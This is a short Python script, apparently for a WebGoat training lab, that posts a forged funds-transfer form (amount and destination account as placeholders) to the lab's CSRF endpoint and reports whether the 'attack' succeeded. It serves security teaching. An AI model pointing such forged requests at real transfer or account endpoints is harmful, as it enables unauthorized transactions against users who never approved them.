import requests

webgoat_url = "http://__HOST_IP__:8080/WebGoat/CSRF/attack"
payload = {
    "transfer_amount": "__TRANSFER_AMOUNT__",
    "to_account": "__TO_ACCOUNT__"
}

# Simulate the attacker's crafted form submission
response = requests.post(webgoat_url, data=payload)
if response.status_code == 200:
    print("[+] CSRF attack executed!")
else:
    print(f"[-] CSRF attack failed. Status code: {response.status_code}")

